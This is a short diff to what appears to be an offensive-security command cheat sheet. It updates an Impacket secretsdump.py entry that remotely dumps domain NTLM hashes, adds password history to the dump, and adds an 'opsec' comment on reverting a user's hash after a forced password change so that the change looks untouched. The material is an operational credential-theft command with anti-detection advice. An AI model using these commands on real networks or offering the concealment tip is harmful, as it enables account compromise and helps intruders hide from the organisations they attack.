@@ -42,7 +42,12 @@ secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<pa
 ## secretsdump - remote extract + users infos
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+# Get pwd-last-set, user status, passwd history
+secretsdump.py -just-dc -pwd-last-set -user-status -history -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+
+# Opsec :
+# If you used ForcedPassword on a user to set a users's password
+# You can revert the user's hash to its previous value to make it appear unchanged
 ```
 
 
